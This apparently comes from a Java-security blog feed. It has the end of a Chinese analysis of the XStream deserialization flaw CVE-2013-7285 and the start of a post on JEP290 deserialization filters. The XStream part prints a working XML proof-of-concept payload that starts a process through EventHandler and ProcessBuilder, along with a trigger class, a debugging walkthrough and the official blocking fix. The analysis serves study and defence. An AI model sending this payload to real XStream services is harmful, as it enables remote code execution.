class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//-------------------------------------part4----------------------------------  </span><span class="token comment">//调用invoke,调用函数,执行命令  </span>                    <span class="token keyword">return</span> <span class="token class-name">MethodUtil</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var13<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>  <span class="token comment">//------------------------------------------------------------------------------  </span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token class-name">Throwable</span> var8 <span class="token operator">=</span> var11<span class="token punctuation">.</span><span class="token function">getTargetException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">throw</span> var8 <span class="token keyword">instanceof</span> <span class="token class-name">RuntimeException</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span><span class="token punctuation">)</span>var8 <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一说一看到这里的时候，就感觉 XStream 可能比较多的会通过动态代理作为 sink</p><h4 id="DynamicProxyConverter-动态代理转换器"><a href="#DynamicProxyConverter-动态代理转换器" class="headerlink" title="DynamicProxyConverter 动态代理转换器"></a>DynamicProxyConverter 动态代理转换器</h4><p>DynamicProxyConverter 即动态代理转换器，是 XStream 支持的一种转换器，其存在使得 XStream 能够把 XML 内容反序列化转换为动态代理类对象：</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/DynamicProxyConverter.png" class=""><p>XStream 反序列化漏洞的 PoC 都是以 <code>DynamicProxyConverter</code> 这个转换器为基础来编写的。</p><p>以官网给的例子为例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dynamic-proxy</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface</span><span class="token punctuation">></span></span>com.foo.Blah<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface</span><span class="token punctuation">></span></span>com.foo.Woo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>handler</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.foo.MyHandler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span>blah<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>handler</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dynamic-proxy</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dynamic-proxy 标签在 XStream 反序列化之后会得到一个动态代理类对象，当访问了该对象的<code>com.foo.Blah</code> 或 <code>com.foo.Woo</code> 这两个接口类中声明的方法时（即 interface 标签内指定的接口类），就会调用 handler 标签中的类方法 <code>com.foo.MyHandler</code></p><h2 id="0x02-CVE-2013-7285"><a href="#0x02-CVE-2013-7285" class="headerlink" title="0x02 CVE-2013-7285"></a>0x02 CVE-2013-7285</h2><p><strong>PoC</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sorted-set</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dynamic-proxy</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface</span><span class="token punctuation">></span></span>java.lang.Comparable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>handler</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.EventHandler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>command</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>Calc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>command</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span><span class="token punctuation">></span></span>start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>handler</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dynamic-proxy</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sorted-set</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到 PoC 这里大致是明白了，在之前有一段代码是读取每一个 XML 的节点，读取这些节点之后应该是用动态代理触发 <code>invoke()</code> 了</p><p><strong>触发代码</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span></span><span class="token class-name">XStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span>io<span class="token punctuation">.</span>xml<span class="token punctuation">.</span></span><span class="token class-name">DomDriver</span></span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>    <span class="token comment">// CVE_2013_7285 Exploit  </span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CVE_2013_7285</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>          <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"G:\\OneDrive - yapuu\\Java安全学习\\JavaSecurityLearning\\JavaSecurity\\XStream\\XStream\\XStream-Basic\\src\\main\\java\\person.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">XStream</span> xStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DomDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          xStream<span class="token punctuation">.</span><span class="token function">fromXML</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>XStream 反序列化漏洞的存在是因为 XStream 支持一个名为 <code>DynamicProxyConverter</code> 的转换器，该转换器可以将 XML 中 <code>dynamic-proxy</code> 标签内容转换成动态代理类对象，而当程序调用了 <code>dynamic-proxy</code> 标签内的 <code>interface</code> 标签指向的接口类声明的方法时，就会通过动态代理机制代理访问 <code>dynamic-proxy</code> 标签内 <code>handler</code> 标签指定的类方法。</p><p>利用这个机制，攻击者可以构造恶意的XML内容，即 <code>dynamic-proxy</code> 标签内的 <code>handler</code> 标签指向如 <code>EventHandler</code> 类这种可实现任意函数反射调用的恶意类、<code>interface</code> 标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意 XML 内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>下断点调试一下，这里前面的流程和分析 XStream 流程是类似的，会调用<code>HierarchicalStreams.readClassType()</code> 来获取到 PoC XML 中根标签的类类型</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/readClassTypeCVE.png" class=""><p>后面会跟进到 <code>mapper.realClass()</code> 进行循环遍历，用来查找 XML 中的根标签为何类型（前面也都分析过了），接着是调用 <code>convertAnother()</code> 函数对 <code>java.util.SortedSet</code> 类型进行转换，我们跟进去该函数，其中调用 <code>mapper.defaultImplementationOf()</code> 函数来寻找 <code>java.util.SortedSet</code> 类型的默认实现类型进行替换，这里转换为了 <code>java.util.TreeSet</code> 类型</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/defaultImplementationOf.png" class=""><p>接着就是寻找 Convert 的过程，这里寻找到对应的转换器是 <code>TreeMapConverter</code> 转换器</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/ConvertValues.png" class=""><p>往下调试，在 <code>AbstractReferenceUnmarshaller.convert()</code> 函数中看到，会调用 <code>getCurrentReferenceKey()</code> 来获取当前的 Reference 键，并且会将当前的 Reference 键压到栈中，这个 Reference 键后续会和保存的类型 —— <code>java.util.TreeSet</code> 类一一对应起来。</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/convertReference.png" class=""><p>接着调用其父类即的 <code>FastStack.convert()</code> 方法，跟进去，显示将类型压入栈，然后调用转换器 TreeSetConverter 的 <code>unmarshal()</code> 方法：</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/convertPush.png" class=""><p>在它第 61 行调用了 <code>treeMapConverter.unmarshalComparator()</code> 方法，这个方法获取到了第二个 XML 节点元素，这个方法当时漏看了，这个方法还是比较重要的，它获取到了 xml 根元素的子元素。</p><p>跟进之后就变得一目了然了，其中判断 <code>reader</code> 是否还有子元素</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/hasMoreChildren.png" class=""><p>下面的 <code>reader.movedown()</code> 方法做了获取子元素，并把子元素添加到当前 context 的 pathTracker</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/moveDown.png" class=""><p>往下调试，在 <code>TreeSetConverter.unmarshal()</code> 方法中调用了 <code>this.treeMapConverter.populateTreeMap()</code>，从这个方法开始，XStream 开始处理了 XML 里面其他的节点元素。跟进该函数，先判断是否是第一个元素，是的话就调用 <code>putCurrentEntryIntoMap()</code>函数，即将当前内容缓存到 Map 中：</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/JudgeElement.png" class=""><p>跟进去，发现调用 <code>readItem()</code> 方法读取标签内的内容并缓存到当前 Map 中</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/readItem.png" class=""><p>这里再跟进 <code>readItem()</code> 方法，会发现比较有意思的一点是它又调用了 <code>HierarchicalStreams.readClassType()</code> 和 <code>context.convertAnother()</code> 方法，而这里的元素已经变成了第二个元素，也就是 <code>&lt;dynamic-proxy&gt;</code>，这里有点像是递归调用</p><p>可以跟进去看一下，这里通过查看 <code>mapper</code> 可以知道目前拿去保存在 mapper 当中的还是两个元素，而 XStream 的处理，则会处理最新的一个（最里层的一个）</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/littleNode.png" class=""><p>经过处理之后返回的 type 就为最新的一个子元素的类型，这里是 <code>com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</code>，对应的转换器为 <code>DynamicProxyConverter</code>，跟进到其中来看具体处理。</p><p>先判断当前元素是否还有子元素，并获取该子元素进行后续判断</p><p>根据我们所编写的 xml，获取到的子元素为 <code>&lt;interface&gt;</code>，经过判断 <code>if (elementName.equals(&quot;interface&quot;))</code>，如果为 true，则将目前 <code>&lt;interface&gt;</code> 节点的元素获取到，再获得转换类型。</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/ifInterface.png" class=""><p>因为仍旧存在子元素，获取完 <code>&lt;interface&gt;</code> 后重新进入这个迭代，下一个获取到的子元素是 <code>&lt;handler&gt;</code>。这里程序会判断是否等于 handler，如果等于 handler，则获取它标签所对应的类，并跳出迭代。</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/handler.png" class=""><p>往下走，第 125 行调用了 <code>Proxy.newProxyInstance()</code> 方法，这里是动态代理中的，实例化代理类的过程。第 127 行这里，调用 <code>context.convertAnother()</code> 方法，跟进一下。对应的转换器是 <code>AbstractReflectionConverter</code>，它会先调用 <code>instantiateNewInstance()</code> 方法实例化一个 <code>EventHandler</code> 类</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/AbstractReflectionConverter.png" class=""><p>往下，跟进 <code>doUnmarshal()</code> 方法，这里又是一层内部递归，从 xml 中可以看到 <code>&lt;handler&gt;</code> 节点之下还有很多子节点（又看到了熟悉的 <code>hasChildren()</code></p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/smilar.png" class=""><p>这时我们获取到的 type 为 <code>class java.lang.ProcessBuilder</code>，跟进 <code>unmarshallField()</code> 方法</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/unmarshallField.png" class=""><p>后面也都是类似的运行流程了，这里就不再废话，师傅们可以自行分析一下，是很容易看懂的；XSteam 虽然处理了 xml，且我们也基本明白了基础运行流程，但是最后漏洞触发这里还是要关注一下。</p><p>将所有的节点过完一遍之后，最终还是会走到 <code>treeMapConverter.populateTreeMap()</code> 这个地方</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/populateTreeMapEnd.png" class=""><p>跟进，直到第 122 行，调用 <code>put.All()</code> 方法，里面的变量为 sortedMap，查看一下它的值可以发现这是一串链式存储的数据</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/sortedMap.png" class=""><p>最终是调用到 <code>EventHandler.invoke()</code> 方法调用栈如下，还是比较简单的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">invoke<span class="token operator">:</span><span class="token number">428</span><span class="token punctuation">,</span> <span class="token class-name">EventHandler</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>beans<span class="token punctuation">)</span>compareTo<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> $<span class="token class-name">Proxy0</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>proxy<span class="token punctuation">)</span>compare<span class="token operator">:</span><span class="token number">1294</span><span class="token punctuation">,</span> <span class="token class-name">TreeMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>put<span class="token operator">:</span><span class="token number">538</span><span class="token punctuation">,</span> <span class="token class-name">TreeMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>putAll<span class="token operator">:</span><span class="token number">281</span><span class="token punctuation">,</span> <span class="token class-name">AbstractMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>putAll<span class="token operator">:</span><span class="token number">327</span><span class="token punctuation">,</span> <span class="token class-name">TreeMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>populateTreeMap<span class="token operator">:</span><span class="token number">122</span><span class="token punctuation">,</span> <span class="token class-name">TreeMapConverter</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span>converters<span class="token punctuation">.</span>collections<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后成功调用了 <code>java.lang.ProcessBuilder#start</code> 方法，命令执行</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Calc.png" class=""><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>根据官方的修复手段，这里其实增加了黑名单</p><p>Users can register an own converter for dynamic proxies, the <em>java.beans.EventHandler</em> type or for the <em>java.lang.ProcessBuilder</em> type, that also protects against an attack for this special case:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">xstream<span class="token punctuation">.</span><span class="token function">registerConverter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Converter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">canConvert</span><span class="token punctuation">(</span><span class="token class-name">Class</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> type <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>EventHandler</span> <span class="token operator">||</span> type <span class="token operator">==</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span> <span class="token operator">||</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">isProxy</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">unmarshal</span><span class="token punctuation">(</span><span class="token class-name">HierarchicalStreamReader</span> reader<span class="token punctuation">,</span> <span class="token class-name">UnmarshallingContext</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConversionException</span><span class="token punctuation">(</span><span class="token string">"Unsupported type due to security reasons."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">marshal</span><span class="token punctuation">(</span><span class="token class-name">Object</span> source<span class="token punctuation">,</span> <span class="token class-name">HierarchicalStreamWriter</span> writer<span class="token punctuation">,</span> <span class="token class-name">MarshallingContext</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConversionException</span><span class="token punctuation">(</span><span class="token string">"Unsupported type due to security reasons."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">XStream</span><span class="token punctuation">.</span><span class="token constant">PRIORITY_LOW</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>XStream 最基础的漏洞是 CVE-2013-7285，通过这个漏洞可以很好的先认识 XStream 的基础运行流程，后续的漏洞挖掘和修复也算是一些《攻防史》，还是比较有意思的</p><h2 id="0x05-Ref"><a href="#0x05-Ref" class="headerlink" title="0x05 Ref"></a>0x05 Ref</h2><p><a class="link"   href="https://x-stream.github.io/CVE-2013-7285.html" >https://x-stream.github.io/CVE-2013-7285.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;主要是了解一下 XStream 的运行流程，分析 CVE-2013-7285&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 JEP290</title>
    <link href="https://drun1baby.github.io/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/"/>
    <id>https://drun1baby.github.io/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/</id>
    <published>2023-04-18T14:00:48.000Z</published>
    <updated>2023-06-30T17:10:34.198Z</updated>
    
    <content type="html"><![CDATA[<p>浅谈 JEP290</p><span id="more"></span><h1 id="浅谈-JEP290"><a href="#浅谈-JEP290" class="headerlink" title="浅谈 JEP290"></a>浅谈 JEP290</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>属于是拖了很久的文章了，4.18 筹划着开始写，6.22 左右才真正开始提笔。</p><p>一开始提到这个概念可能会比较懵逼，其实这就是为什么<strong>高版本 jdk 有部分能打 jndi，打不了 RMI</strong></p><p>8u121 ~ 8u230 打不了 RMI</p><h2 id="0x02-关于-JEP290"><a href="#0x02-关于-JEP290" class="headerlink" title="0x02 关于 JEP290"></a>0x02 关于 JEP290</h2><p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事</p><p>1、提供一个限制反序列化类的机制，白名单或者黑名单。<br>2、限制反序列化的深度和复杂度。<br>3、为 RMI 远程调用对象提供了一个验证类的机制。<br>4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。</p><p>官方从 8u121，7u13，6u141 分别支持了这个 JEP</p><h2 id="0x03-JEP290-防御手段分析"><a href="#0x03-JEP290-防御手段分析" class="headerlink" title="0x03 JEP290 防御手段分析"></a>0x03 JEP290 防御手段分析</h2><p>先起一个 RMI 的服务，代码详见 —— <a class="link"   href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI" >https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI<i class="fas fa-external-link-alt"></i></a></p><p>尝试去攻击，这里会报错，报错部分信息为</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> filterCheck信息<span class="token operator">:</span> <span class="token class-name">ObjectInputFilter</span> <span class="token constant">REJECTED</span><span class="token operator">:</span> <span class="token keyword">class</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>AnnotationInvocationHandler</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/attackFailed.png" class=""><p>可以先看一下官方文档对于 JEP290 的描述 <a class="link"   href="http://openjdk.java.net/jeps/290" >http://openjdk.java.net/jeps/290<i class="fas fa-external-link-alt"></i></a></p><ul><li>我们很容易通过描述来看对应增加的 Filter 点是什么，如图找到了 <code>ObjectInputFilter</code> 相关的类</li></ul><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/objectFilter.png" class=""><p>我这里去看了看 <code>ObjectInputFilter</code> 相关的类，断点是下不去的，所以去到控制台去看，发现在 <code>RegistryImpl_Skel</code> 类中也存在报错现象，而这个类在 RMI 中是用来做反序列化的方法的。</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/DebugReadObject.png" class=""><p>跟进，<code>ObjectInputStream</code> 类调用了 <code>readObject0()</code> 方法，继续跟进</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/readObject0.png" class=""><p>先获取输入当中 <code>blkmode</code>，如果数据为 true，则继续进行后续判断，后续做了一部分的数据处理工作，我们直接来看最重要的地方 1573 行，调用了 <code>checkResolve()</code> 方法，跟进</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/checkResolve.png" class=""><p>跟进 <code>readClassDesc()</code> 方法，这个方法主要是读取并返回类描述符，并判断这一类描述符是否可以解析为本地 VM 中的类。</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/readClassDesc.png" class=""><p>在 <code>readClassDesc()</code> 方法中，判断 tc 所对应的类型，这里跟进 <code>readProxyDesc()</code> 方法</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/readProxyDesc.png" class=""><p><code>readProxyDesc()</code> 方法做完一系列基础判断之后调用了 <code>filterCheck()</code> 方法，跟进</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/filterCheck.png" class=""><p>而 <code>filterCheck()</code> 方法又调用了 <code>checkInput()</code> 方法，这里应该是最终来判断输入是否合法的地方。</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/checkInput.png" class=""><p>这里的判断会进行两次，一个是开启 JVM 的 <code>java.rmi.Remote</code> 